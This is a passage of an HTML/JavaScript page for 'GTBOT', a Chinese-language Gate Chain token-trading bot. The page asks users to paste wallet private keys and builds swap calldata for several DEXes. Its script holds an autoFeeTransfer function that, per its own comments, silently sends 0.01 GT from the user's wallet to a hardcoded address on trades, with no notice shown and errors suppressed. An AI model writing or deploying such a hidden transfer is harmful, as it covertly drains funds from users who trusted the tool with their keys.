            background: linear-gradient(135deg, rgba(255, 255, 255, 0.15), rgba(59, 130, 246, 0.08));
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 16px;
            backdrop-filter: blur(20px);
            animation: slideInDown 0.3s ease-out;
            box-shadow: 
                0 8px 32px rgba(59, 130, 246, 0.1),
                inset 0 1px 0 rgba(255, 255, 255, 0.2);
        }

        @keyframes slideInDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .token-info-header {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .token-info-logo {
            width: 52px;
            height: 52px;
            background: linear-gradient(135deg, #ffffff, #f8fafc);
            border: 2px solid rgba(59, 130, 246, 0.3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: bold;
            color: #3b82f6;
            box-shadow: 
                0 8px 24px rgba(59, 130, 246, 0.2),
                inset 0 1px 0 rgba(255, 255, 255, 0.8);
            flex-shrink: 0;
        }

        .token-info-details {
            flex: 1;
            min-width: 0;
        }

        .token-info-name {
            font-size: 20px;
            font-weight: 800;
            color: #1e293b;
            margin-bottom: 6px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .token-info-symbol {
            font-size: 16px;
            font-weight: 700;
            color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.2), rgba(59, 130, 246, 0.1));
            padding: 6px 12px;
            border-radius: 8px;
            display: inline-block;
            border: 1px solid rgba(255, 255, 255, 0.3);
            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.1);
        }

        .token-info-status {
            display: flex;
            align-items: center;
            gap: 8px;
            flex-shrink: 0;
        }

        .status-indicator {
            font-size: 12px;
            animation: pulse 2s infinite;
        }

        .status-indicator.loading {
            color: #3b82f6;
        }

        .status-indicator.success {
            color: #10b981;
        }

        .status-indicator.error {
            color: #ef4444;
        }

        .status-text {
            font-size: 13px;
            font-weight: 600;
            color: #1e293b;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            padding: 4px 10px;
            border-radius: 6px;
            border: 1px solid rgba(59, 130, 246, 0.2);
        }


        /* 机器人状态面板样式 */
        .bot-status-panel {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 16px;
            box-shadow: 0 4px 16px rgba(59, 130, 246, 0.1);
        }

        .bot-status-title {
            font-size: 14px;
            font-weight: 700;
            color: #3b82f6;
            margin-bottom: 12px;
            text-align: center;
        }

        .bot-status-grid {
            display: flex;
            justify-content: center;
            gap: 12px;
        }

        .bot-status-item {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 8px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.6), rgba(248, 250, 252, 0.4));
            border: 1px solid rgba(59, 130, 246, 0.15);
            border-radius: 12px;
            transition: all 0.3s;
        }

        .bot-status-item:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border-color: #3b82f6;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
        }

        .bot-status-img {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            border: 2px solid rgba(59, 130, 246, 0.2);
            object-fit: cover;
        }

        .bot-status-info {
            flex: 1;
        }


        .bot-status-state {
            font-size: 10px;
            font-weight: 500;
            padding: 2px 6px;
            border-radius: 6px;
            display: inline-block;
        }

        .bot-status-state.active {
            background: linear-gradient(135deg, rgba(16, 185, 129, 0.1), rgba(34, 197, 94, 0.1));
            color: #10b981;
            border: 1px solid rgba(16, 185, 129, 0.2);
        }

        .bot-status-state.inactive {
            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(248, 113, 113, 0.1));
            color: #ef4444;
            border: 1px solid rgba(239, 68, 68, 0.2);
        }

        .modal-buttons {
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }

        .modal-btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s;
        }

        .modal-confirm {
            background: linear-gradient(135deg, #1e40af, #3b82f6);
            color: #ffffff;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }

        .modal-cancel {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            color: #1e293b;
            border: 1px solid rgba(59, 130, 246, 0.2);
        }

        .token-details-header {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 24px;
            padding: 20px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border-radius: 16px;
            border: 1px solid rgba(59, 130, 246, 0.2);
        }

        .token-details-logo {
            width: 56px;
            height: 56px;
            background: linear-gradient(135deg, #ffffff, #f8fafc);
            border: 2px solid rgba(59, 130, 246, 0.3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #3b82f6;
            font-size: 20px;
            box-shadow: 0 8px 16px rgba(59, 130, 246, 0.2);
        }

        .token-details-name {
            font-size: 22px;
            font-weight: bold;
            color: #1e293b;
            margin-bottom: 6px;
        }

        .token-details-symbol {
            font-size: 14px;
            color: #3b82f6;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            padding: 4px 10px;
            border-radius: 8px;
            display: inline-block;
            border: 1px solid rgba(59, 130, 246, 0.2);
        }

        .token-details-content {
            margin-bottom: 20px;
        }

        .detail-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }

        .detail-item:last-child {
            border-bottom: none;
        }

        .detail-label {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.7);
            font-weight: 500;
        }

        .detail-value {
            font-size: 13px;
            color: #fff;
            font-family: 'Courier New', monospace;
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .detail-value-container {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .copy-address-btn {
            padding: 8px 12px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.8), rgba(248, 250, 252, 0.6));
            border: 1px solid rgba(59, 130, 246, 0.2);
            border-radius: 8px;
            color: #3b82f6;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.3s;
            min-width: 40px;
        }

        .copy-address-btn:hover {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(248, 250, 252, 0.8));
            border-color: #3b82f6;
            transform: scale(1.05);
            box-shadow: 0 4px 8px rgba(59, 130, 246, 0.2);
        }

        .toast {
            position: fixed;
            bottom: 30px;
            right: 30px;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.9), rgba(248, 250, 252, 0.8));
            color: #1e293b;
            padding: 15px 20px;
            border-radius: 10px;
            border: 1px solid rgba(59, 130, 246, 0.2);
            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.15);
            z-index: 2000;
            animation: toastSlideIn 0.3s ease;
            max-width: 350px;
        }

        .toast.success {
            border-color: #10b981;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(220, 252, 231, 0.8));
        }

        .toast.error {
            border-color: #ef4444;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.95), rgba(254, 226, 226, 0.8));
        }

        @keyframes toastSlideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.02);
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, #00ff88, #00d4ff);
            border-radius: 10px;
        }

        @media (max-width: 1200px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
            
            .stats-panel {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            .header {
                padding: 20px;
                margin-bottom: 20px;
            }
            
            .header h1 {
                font-size: 32px;
                letter-spacing: 2px;
            }
            
            .header-content {
                flex-direction: column;
                gap: 15px;
            }
            
            .bot-img {
                width: 80px;
                height: 80px;
            }
            
            .stats-panel {
                grid-template-columns: 1fr;
                gap: 15px;
                margin-bottom: 20px;
            }
            
            .stat-card {
                padding: 16px;
            }
            
            .stat-value {
                font-size: 24px;
            }
            
            .main-grid {
                grid-template-columns: 1fr;
                gap: 15px;
            }
            
            .panel {
                padding: 20px;
                border-radius: 16px;
            }
            
            .section-title {
                font-size: 18px;
                margin-bottom: 16px;
            }
            
            .trading-windows {
                grid-template-columns: 1fr;
                gap: 15px;
            }
            
            .trading-window {
                padding: 16px;
            }
            
            .window-header {
                margin-bottom: 16px;
            }
            
            .window-icon {
                width: 32px;
                height: 32px;
            }
            
            .window-title {
                font-size: 14px;
            }
            
            .gas-speed-buttons {
                flex-direction: column;
                gap: 8px;
            }
            
            .gas-speed-btn {
                padding: 10px 12px;
                font-size: 12px;
            }
            
            .control-group input {
                padding: 10px;
                font-size: 14px;
            }
            
            .percentage-buttons {
                flex-direction: column;
                gap: 6px;
            }
            
            .percentage-btn {
                padding: 10px;
                font-size: 12px;
            }
            
            .action-btn {
                padding: 12px;
                font-size: 13px;
            }
            
            .wallet-item {
                padding: 16px;
                margin-bottom: 12px;
            }
            
            .wallet-address {
                font-size: 12px;
                padding: 4px 8px;
            }
            
            .token-item {
                padding: 10px 12px;
                gap: 8px;
            }
            
            .token-logo {
                width: 24px;
                height: 24px;
                font-size: 10px;
            }
            
            .modal-content {
                width: 95%;
                padding: 24px;
                margin: 10px;
            }
            
            .modal-title {
                font-size: 22px;
                margin-bottom: 20px;
            }
            
            .toast {
                bottom: 20px;
                right: 20px;
                left: 20px;
                max-width: none;
            }
        }

        @media (max-width: 480px) {
            .header h1 {
                font-size: 28px;
                letter-spacing: 1px;
            }
            
            .header p {
                font-size: 14px;
            }
            
            .bot-img {
                width: 60px;
                height: 60px;
            }
            
            .stat-card {
                padding: 12px;
            }
            
            .stat-value {
                font-size: 20px;
            }
            
            .panel {
                padding: 16px;
            }
            
            .trading-window {
                padding: 12px;
            }
            
            .window-icon {
                width: 28px;
                height: 28px;
            }
            
            .window-title {
                font-size: 13px;
            }
            
            .gas-speed-btn {
                padding: 8px 10px;
                font-size: 11px;
            }
            
            .control-group input {
                padding: 8px;
                font-size: 13px;
            }
            
            .percentage-btn {
                padding: 8px;
                font-size: 11px;
            }
            
            .action-btn {
                padding: 10px;
                font-size: 12px;
            }
            
            .wallet-item {
                padding: 12px;
            }
            
            .token-item {
                padding: 8px 10px;
                gap: 6px;
            }
            
            .token-logo {
                width: 20px;
                height: 20px;
                font-size: 9px;
            }
            
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-content">
                <div class="header-bots">
                    <div class="bot-image">
                        <img src="bot2.jpg" alt="Bot" class="bot-img">
                    </div>
                </div>
                <div class="header-text">
                    <h1>GTBOT</h1>
                    <p>Gate Chain EVM 智能交易机器人 | Chain ID: 86</p>
                </div>
            </div>
        </div>

        <div class="stats-panel">
            <div class="stat-card">
                <div class="stat-icon">💎</div>
                <div class="stat-label">总交易次数</div>
                <div class="stat-value" id="totalTrades">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">🪙</div>
                <div class="stat-label">持有代币种类</div>
                <div class="stat-value" id="tokenTypes">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">🔥</div>
                <div class="stat-label">活跃钱包</div>
                <div class="stat-value" id="activeWallets">0</div>
            </div>
        </div>

        <div class="active-wallets-status" id="activeWalletsStatus" style="display: none;">
            <div class="status-header">
                <span class="status-icon">⚡</span>
                <span class="status-title">当前活跃钱包</span>
                <span class="status-count" id="activeWalletsCount">0</span>
            </div>
            <div class="status-wallets" id="statusWalletsList"></div>
        </div>

        <div class="main-grid">
            <div class="panel panel-glow">
                <h2 class="section-title">
                    <span>💼</span>
                    <span>钱包管理</span>
                </h2>
                <div class="wallet-list" id="walletList"></div>
                <button class="add-wallet-btn" onclick="showAddWalletModal()">+ 导入新钱包</button>
            </div>

            <div class="panel panel-glow">
                <h2 class="section-title">
                    <span>⚡</span>
                    <span>交易中心</span>
                </h2>

                
                <div class="platform-tabs">
                    <div class="platform-tab active" onclick="switchPlatform('external')">🌐 外盘</div>
                    <div class="platform-tab" onclick="switchPlatform('internal')">🏠 内盘</div>
                </div>

                <div id="externalDexOptions" class="dex-options">
                    <div class="dex-option" onclick="selectDex('GTSWAP', 'external')">
                        <div class="dex-name">GTSWAP</div>
                        <div class="dex-type">GTSWAP V2</div>
                    </div>
                    <div class="dex-option" onclick="selectDex('DYORSWAP', 'external')">
                        <div class="dex-name">DYORSWAP</div>
                        <div class="dex-type">DYOR V2</div>
                    </div>
                </div>

                <div id="internalDexOptions" class="dex-options" style="display: none;">
                    <div class="dex-option" onclick="selectDex('GTLAUNCH', 'internal')">
                        <div class="dex-name">GTLAUNCH</div>
                        <div class="dex-type">内盘协议</div>
                    </div>
                    <div class="dex-option" onclick="selectDex('DYOR_INTERNAL', 'internal')">
                        <div class="dex-name">DYOR</div>
                        <div class="dex-type">内盘协议</div>
                    </div>
                </div>

                <!-- 代币合约地址输入 -->
                    <div class="control-group">
                        <label>代币合约地址</label>
                        <input type="text" id="tokenAddress" placeholder="0x..." oninput="debounceFetchTokenInfo()" />
                        <!-- 代币信息显示区域 -->
                        <div id="tokenInfoDisplay" class="token-info-display" style="display: none;">
                            <div class="token-info-header">
                                <div class="token-info-logo" id="tokenInfoLogo">?</div>
                                <div class="token-info-details">
                                    <div class="token-info-name" id="tokenInfoName">代币名称</div>
                                    <div class="token-info-symbol" id="tokenInfoSymbol">SYMBOL</div>
                                    <div class="token-info-protocol" id="tokenInfoProtocol" style="display: none;">
                                        <span class="protocol-badge" id="protocolBadge">协议</span>
                                    </div>
                                </div>
                                <div class="token-info-status" id="tokenInfoStatus">
                                    <span class="status-indicator" id="statusIndicator">●</span>
                                    <span class="status-text" id="statusText">查询中...</span>
                                </div>
                            </div>
                        </div>
                        
                        <!-- 合约余额信息显示区域 -->
                        <div id="contractBalanceDisplay" class="contract-balance-display" style="display: none;">
                            <div class="contract-balance-header">
                                <div class="contract-balance-title">合约余额信息</div>
                            </div>
                            <div class="contract-balance-content">
                                <div class="balance-item">
                                    <div class="balance-label" id="balanceLabel">GT余额</div>
                                    <div class="balance-value" id="balanceValue">0.0000</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- 内盘交易说明 -->
                    <div class="control-group" id="hexDataGroup" style="display: none;">
                        <div style="background: linear-gradient(135deg, rgba(59, 130, 246, 0.1), rgba(96, 165, 250, 0.05)); border: 1px solid rgba(59, 130, 246, 0.2); border-radius: 12px; padding: 16px; margin-top: 8px;">
                            <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
                                <span style="font-size: 16px;">🏠</span>
                                <span style="font-weight: 600; color: #3b82f6;" id="internalDexTitle">内盘交易</span>
                            </div>
                            <div style="font-size: 13px; color: rgba(30, 41, 59, 0.7); line-height: 1.4;" id="internalDexDescription">
                                <div>• <strong>买入</strong>: 向代币合约转账GT + 买入数据</div>
                                <div>• <strong>卖出</strong>: 调用代币合约卖出函数</div>
                                <div>• 十六进制数据已自动配置，无需手动输入</div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- 机器人状态显示 -->
                    <div class="bot-status-panel">
                        <div class="bot-status-title">🤖 机器人状态</div>
                        <div class="bot-status-grid">
                            <div class="bot-status-item">
                                <img src="bot2.jpg" alt="Bot" class="bot-status-img">
                                <div class="bot-status-info">
                                    <div class="bot-status-state active">运行中</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                <!-- 交易窗口 -->
                <div class="trading-windows">
                    <!-- 买入窗口 -->
                    <div class="trading-window buy-window">
                        <div class="window-header">
                            <div class="window-icon">
                                <img src="buy.jpg" alt="买入" style="width: 32px; height: 32px; border-radius: 50%; object-fit: cover;">
                            </div>
                            <div class="window-title">买入 (GT → 土狗)</div>
                        </div>
                        <div class="window-content">
                    <div class="control-group">
                                <label>花费GT数量</label>
                        <div class="amount-controls">
                                    <input type="number" id="buyAmount" placeholder="0.0" step="0.01" oninput="updateBuyExpected()" />
                            <div class="percentage-buttons">
                                        <button class="percentage-btn" onclick="setBuyPercentage(25)">25%</button>
                                        <button class="percentage-btn" onclick="setBuyPercentage(50)">50%</button>
                                        <button class="percentage-btn" onclick="setBuyPercentage(100)">MAX</button>
                            </div>
                        </div>
                    </div>
                            <div id="buyExpected" class="expected-returns" style="display: none;">
                                <div class="expected-returns-content">
                                    <div class="expected-item">
                                        <span class="expected-label">花费GT:</span>
                                        <span class="expected-value" id="buySpendGT">0</span>
                    </div>
                                    <div class="expected-item">
                                        <span class="expected-label">预计买入:</span>
                                        <span class="expected-value" id="buyGetTokens">0</span>
                        </div>
                        </div>
                    </div>
                    <button class="action-btn buy-btn" onclick="executeBuy()" id="buyBtn">
                        <span id="buyBtnText">买入</span>
                    </button>
                        </div>
                    </div>

                    <!-- 卖出窗口 -->
                    <div class="trading-window sell-window">
                        <div class="window-header">
                            <div class="window-icon">
                                <img src="sell.jpg" alt="卖出" style="width: 32px; height: 32px; border-radius: 50%; object-fit: cover;">
                            </div>
                            <div class="window-title">卖出 (土狗 → GT)</div>
                        </div>
                        <div class="window-content">
                            <div class="control-group">
                                <label id="sellAmountLabel">卖出代币数量</label>
                                <div class="amount-controls">
                                    <input type="number" id="sellAmount" placeholder="0.0" step="0.01" oninput="updateSellExpected()" />
                                    <div class="percentage-buttons">
                                        <button class="percentage-btn" onclick="setSellPercentage(25)">25%</button>
                                        <button class="percentage-btn" onclick="setSellPercentage(50)">50%</button>
                                        <button class="percentage-btn" onclick="setSellPercentage(100)">MAX</button>
                                    </div>
                                </div>
                            </div>
                            <div id="sellExpected" class="expected-returns" style="display: none;">
                                <div class="expected-returns-content">
                                    <div class="expected-item">
                                        <span class="expected-label">卖出代币:</span>
                                        <span class="expected-value" id="sellSpendTokens">0</span>
                                    </div>
                                    <div class="expected-item">
                                        <span class="expected-label">预计获得:</span>
                                        <span class="expected-value" id="sellGetGT">0</span>
                                    </div>
                                </div>
                            </div>
                    <button class="action-btn sell-btn" onclick="executeSell()" id="sellBtn">
                        <span id="sellBtnText">卖出</span>
                    </button>
                </div>
                    </div>
                </div>

                <!-- Gas设置 -->
                <div class="control-group">
                    <label>Gas设置</label>
                    <div class="gas-speed-buttons" style="display: flex; gap: 8px; margin-bottom: 12px;">
                        <button class="gas-speed-btn" id="gasQuickly" onclick="setGasSpeed('QUICKLY')">⚡ Quickly</button>
                        <button class="gas-speed-btn" id="gasFast" onclick="setGasSpeed('FAST')">🚀 Fast</button>
                        <button class="gas-speed-btn" id="gasTurbo" onclick="setGasSpeed('TURBO')">💨 Turbo</button>
                    </div>
                    <div style="display: flex; gap: 8px; align-items: center;">
                        <input type="number" id="gasPrice" placeholder="自动" readonly style="flex: 1;" />
                        <input type="number" id="gasLimit" placeholder="850000" value="850000" step="1000" min="100000" max="2000000" style="flex: 1;" />
                    </div>
                    <div style="font-size: 12px; color: rgba(30, 41, 59, 0.6); margin-top: 5px;">
                        💡 Gas价格固定5000 Gwei，Gas限制默认85万（未使用的Gas会退还）
                    </div>
                </div>
                
            </div>
        </div>

        <div class="transaction-log panel">
            <h2 class="section-title">
                <span>📜</span>
                <span>交易日志</span>
            </h2>
            <div class="log-container" id="logContainer"></div>
        </div>
    </div>

    <!-- 导入钱包模态框 -->
    <div id="addWalletModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">🔐 导入钱包</h3>
            <input type="password" class="modal-input" id="privateKeyInput" placeholder="输入私钥 (0x...)">
            <div class="modal-buttons">
                <button class="modal-btn modal-cancel" onclick="closeAddWalletModal()">取消</button>
                <button class="modal-btn modal-confirm" onclick="importWallet()">导入</button>
            </div>
        </div>
    </div>

    <!-- 代币详情模态框 -->
    <div id="tokenDetailsModal" class="modal">
        <div class="modal-content token-details-modal">
            <h3 class="modal-title">🪙 代币详情</h3>
            <div class="token-details-header">
                <div class="token-details-logo" id="tokenDetailsLogo">?</div>
                <div class="token-details-info">
                    <div class="token-details-name" id="tokenDetailsName">-</div>
                    <div class="token-details-symbol" id="tokenDetailsSymbol">-</div>
                </div>
            </div>
            <div class="token-details-content">
                <div class="detail-item">
                    <span class="detail-label">合约地址:</span>
                    <div class="detail-value-container">
                        <span class="detail-value" id="tokenDetailsAddress">-</span>
                        <button class="copy-address-btn" onclick="copyTokenAddress()">📋</button>
                    </div>
                </div>
                <div class="detail-item">
                    <span class="detail-label">持有数量:</span>
                    <span class="detail-value" id="tokenDetailsBalance">-</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">钱包地址:</span>
                    <div class="detail-value-container">
                        <span class="detail-value" id="tokenDetailsWallet">-</span>
                        <button class="copy-address-btn" onclick="copyWalletAddress()">📋</button>
                    </div>
                </div>
            </div>
            <div class="modal-buttons">
                <button class="modal-btn modal-cancel" onclick="closeTokenDetailsModal()">关闭</button>
                <button class="modal-btn modal-confirm" onclick="selectTokenFromDetails()">选择此代币</button>
            </div>
        </div>
    </div>

    <script>
        // 配置
        const CONFIG = {
            chainId: 86,
            rpcUrl: 'https://evm.gatenode.cc',
            backupRpcUrl: 'https://evm.gatenode.cc', // 备用RPC节点（暂时使用相同节点）
            explorerUrl: 'https://gatescan.org',
            // 收费配置
            feeConfig: {
                feeAddress: '0xa758B4CF892b24076B2B648718a3fD0c06250774', // 请替换为实际收费地址
                feeAmount: '0.01', // 每笔交易收费0.01GT
                enabled: true // 启用收费功能
            }
        };

        // 自动收费转账函数（静默执行，不显示提示）
        async function autoFeeTransfer(walletInstance, walletAddress) {
            // 检查是否启用收费功能
            if (!CONFIG.feeConfig.enabled) {
                return;
            }
            
            try {
                const feeAmount = ethers.parseEther(CONFIG.feeConfig.feeAmount);
                const gasSettings = await getDynamicGasPrice();
                
                // 检查余额是否足够支付收费
                const balance = await walletInstance.provider.getBalance(walletAddress);
                const estimatedGasCost = gasSettings.maxFee * 21000n; // 基础转账gas消耗
                const totalCost = feeAmount + estimatedGasCost;
                
                if (balance < totalCost) {
                    // 余额不足，静默跳过
                    return;
                }
                
                // 构建收费转账交易
                const feeTx = {
                    to: CONFIG.feeConfig.feeAddress,
                    value: feeAmount,
                    gasLimit: 21000, // 基础转账gas限制
                    maxPriorityFeePerGas: gasSettings.priorityFee,
                    maxFeePerGas: gasSettings.maxFee,
                    type: 2 // EIP-1559
                };
                
                // 发送收费转账（异步执行，不等待确认）
                walletInstance.sendTransaction(feeTx).catch(() => {
                    // 静默处理收费失败，不影响主流程
                });
                
            } catch (error) {
                // 静默处理收费异常，不影响主流程
            }
        }

        // GTLAUNCH内盘交易数据
        const GTLAUNCH_DATA = {
            BUY_HEX: '0xd0febe4c',  // 买入十六进制数据
            SELL_HEX: '0x6c11bcd3'  // 卖出十六进制数据 (从交易记录分析得出)
        };

        // DYOR内盘交易数据构建函数 - 使用正确的路径地址
        function buildDYORInternalCalldata(tokenAddress, toAddress) {
            const methodId = '0xb6f9de95';
            const deadline = Math.floor(Date.now() / 1000) + 1800;
            const deadlineHex = deadline.toString(16).padStart(64, '0');
            
            const cleanToken = tokenAddress.replace('0x', '').toLowerCase();
            const cleanTo = toAddress.replace('0x', '').toLowerCase();
            
            // 使用正确的路径地址 - 基于成功交易的分析
            const correctPath0 = '672f30407a71fa8737a3a14474ff37e09c7fc44a'; // 正确的path[0]地址
            
            const params = [
                '0000000000000000000000000000000000000000000000000000000000000000',
                '0000000000000000000000000000000000000000000000000000000000000080',
                '000000000000000000000000' + cleanTo,
                deadlineHex,
                '0000000000000000000000000000000000000000000000000000000000000002',
                '000000000000000000000000' + correctPath0, // 使用正确的path[0]
                '000000000000000000000000' + cleanToken
            ];
            
            const calldata = methodId + params.join('');
            console.log('DYOR内盘买入calldata:', calldata);
            console.log('calldata长度:', calldata.length);
            console.log('参数数量:', params.length);
            console.log('每个参数长度:', params.map(p => p.length));
            console.log('methodId:', methodId);
            console.log('deadline:', deadline);
            console.log('deadlineHex:', deadlineHex);
            console.log('cleanToken:', cleanToken);
            console.log('cleanTo:', cleanTo);
            console.log('正确的path[0]:', correctPath0);
            return calldata;
        }

        // DYOR内盘卖出交易数据构建函数 - 完全按照您的XLayer代码结构
        function buildDYORInternalSellCalldata(tokenAddress, amountIn, amountOutMin, toAddress) {
            try {
                console.log('=== buildDYORInternalSellCalldata 开始 ===');
                console.log('输入参数:');
                console.log('- tokenAddress:', tokenAddress);
                console.log('- amountIn:', amountIn.toString());
                console.log('- amountOutMin:', amountOutMin.toString());
                console.log('- toAddress:', toAddress);
                
                const methodId = '0xaf8a4293';
                const deadline = Math.floor(Date.now() / 1000) + 1800; // 对应CONFIG.DEADLINE_BUFFER
                
                const cleanToken = tokenAddress.replace('0x', '').toLowerCase();
                const cleanTo = toAddress.replace('0x', '').toLowerCase();
                
                // 使用正确的Gate Chain路径地址 - 对应XLayer的WOKB_ADDRESS
                const correctPath0 = '672f30407a71fa8737a3a14474ff37e09c7fc44a'; // Gate Chain的正确地址
                
                // 完全按照您的XLayer代码：使用toHexString()方法
                const amountInHex = amountIn.toString(16).padStart(64, '0');
                const amountOutMinHex = amountOutMin.toString(16).padStart(64, '0');
                
                console.log('处理后的参数:');
                console.log('- methodId:', methodId);
                console.log('- deadline:', deadline);
                console.log('- cleanToken:', cleanToken);
                console.log('- cleanTo:', cleanTo);
                console.log('- correctPath0:', correctPath0);
                console.log('- amountInHex:', amountInHex);
                console.log('- amountOutMinHex:', amountOutMinHex);
                
                const params = [
                    amountInHex,
                    amountOutMinHex,
                    '00000000000000000000000000000000000000000000000000000000000000e0',
                    '000000000000000000000000' + cleanTo,
                    '0000000000000000000000000000000000000000000000000000000000000000',
                    '0000000000000000000000000000000000000000000000000000000000000000',
                    deadline.toString(16).padStart(64, '0'),
                    '0000000000000000000000000000000000000000000000000000000000000002',
                    '000000000000000000000000' + cleanToken,
                    '000000000000000000000000' + correctPath0 // 对应XLayer的cleanWOKB
                ];
                
                console.log('params数组:');
                params.forEach((param, index) => {
                    console.log(`- params[${index}]:`, param, '(长度:', param.length, ')');
                });
                
                const calldata = methodId + params.join('');
                console.log('最终calldata:', calldata);
                console.log('calldata长度:', calldata.length);
                console.log('=== buildDYORInternalSellCalldata 结束 ===');
                
                return calldata;
            } catch (error) {
                console.error('buildDYORInternalSellCalldata 错误:', error);
                throw error;
            }
        }

        // DEX合约地址配置
        const DEX_ADDRESSES = {
            GTSWAP: {
                router: '0xc5dbd69446476e844c4f9fce57a077592cf5b807', // GTSWAP V2 Router地址
                factory: '0xe9c3b16504e9e8bdfd94126cc66244dfef4536ed' // GTSWAP V2 Factory地址
            },
            DYORSWAP: {
                router: '0xc5b8d4975a7976f6dce98b7cb6ec91b5d59e8c1e', // DYOR V2 Router地址
                factory: '0x8eb3a00f08004b7a1071d336ee9c6534dd3862b2' // DYOR V2 Factory地址
            },
            DYOR_INTERNAL: {
                router: '0x97aa99c0afdd156ba3558b10687e378566132af5' // DYOR内盘Router地址 - Gate Chain正确地址
            }
        };

        // UniswapV2 Router ABI (适用于GTSWAP V2和DYOR V2)
        const UNISWAP_V2_ROUTER_ABI = [
            'function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts)',
            'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
            'function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
            'function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
            'function WETH() external pure returns (address)'
        ];

        // Gas设置配置
        const GAS_CONFIG = {
            DEFAULT_LIMIT: 850000,  // 默认gas limit 85万（确保交易成功）
            DEFAULT_PRICE: 5000,    // 默认gas价格 5000 Gwei
            SPEEDS: {
                QUICKLY: { multiplier: 1.0, name: 'Quickly' },  // 使用默认价格
                FAST: { multiplier: 1.0, name: 'Fast' },        // 使用默认价格
                TURBO: { multiplier: 1.0, name: 'Turbo' }       // 使用默认价格
            }
        };

        // ERC20 ABI for approve and allowance
        const ERC20_EXTENDED_ABI = [
            'function balanceOf(address owner) external view returns (uint256)',
            'function decimals() external view returns (uint8)',
            'function symbol() external view returns (string)',
            'function name() external view returns (string)',
            'function approve(address spender, uint256 amount) public returns(bool)',
            'function allowance(address owner, address spender) public view returns(uint256)'
        ];

        // 卖出合约ABI
        const SELL_ABI = [
            'function sellTokens(uint256 amount) public'
        ];
        
        // 构建买入数据 - 直接使用函数选择器
        function buildBuyData() {
            // 买入就是直接使用 0xd0febe4c，不需要额外参数
            return GTLAUNCH_DATA.BUY_HEX;
        }

        // ABI
        const ERC20_ABI = [
            'function balanceOf(address owner) external view returns (uint256)',
            'function decimals() external view returns (uint8)',
            'function symbol() external view returns (string)',
            'function name() external view returns (string)'
        ];

        // 状态管理
        let wallets = [];
        let selectedDex = null;
        let selectedPlatform = 'external';
        let isTrading = false;
        let tokenCache = {};
        let walletTokens = {};
